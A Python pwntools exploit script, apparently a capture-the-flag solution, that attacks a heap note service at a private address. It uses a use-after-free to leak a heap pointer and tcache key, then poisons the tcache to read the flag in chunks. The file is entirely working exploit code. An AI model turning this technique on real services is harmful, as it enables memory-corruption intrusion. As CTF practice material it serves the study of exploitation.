from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]


def add_note(r, idx: int, length: int):
    r.recvuntil(b"choice: ")
    r.sendline(b"1")
    r.recvuntil(b"Index: ")
    r.sendline(str(idx).encode())
    r.recvuntil(b"Length: ")
    r.sendline(str(length).encode())
    ret = r.recvline()
    assert ret == b"Add done\n"


def read_note(r, idx: int):
    r.recvuntil(b"choice: ")
    r.sendline(b"2")
    r.recvuntil(b"Index: ")
    r.sendline(str(idx).encode())
    r.recvline()
    return r.recvline()


def write_note(r, idx: int, note: bytes):
    r.recvuntil(b"choice: ")
    r.sendline(b"3")
    r.recvuntil(b"Index: ")
    r.sendline(str(idx).encode())
    r.recvuntil(b"Content: ")
    r.send(note)


def delete_note(r, idx: int):
    r.recvuntil(b"choice: ")
    r.sendline(b"4")
    r.recvuntil(b"Index: ")
    r.sendline(str(idx).encode())
    ret = r.recvline()
    assert ret == b"Delete done\n"


def sol(off):
    r = remote("10.113.184.121", 10058)

    # r = process("./chal")
    # attach(
    #     r,
    #     """
    #     b main
    #     continue
    #     """,
    # )
    log.debug("Add note 1")
    add_note(r, 1, 0x30)
    log.debug("Add note 2")
    add_note(r, 2, 0x30)
    log.debug("Delete note 1")
    delete_note(r, 1)
    log.debug("Delete note 2")
    delete_note(r, 2)
    log.debug("Read note 2")
    ret = read_note(r, 2)
    heap_addr = u64(ret[:8])
    log.info("Heap addr: %#x", heap_addr)
    key = u64(ret[8:16])
    log.info("Key: %#x", key)
    write_note(r, 2, p64(heap_addr - off) + p64(0))
    add_note(r, 3, 0x30)
    add_note(r, 4, 0x30)
    flag = read_note(r, 4)
    r.close()
    return flag[:8]


def main():
    flag = b""
    flag += sol(0x40)
    flag += sol(0x38)
    flag += sol(0x30)
    print(flag.decode().strip())


if __name__ == "__main__":
    main()
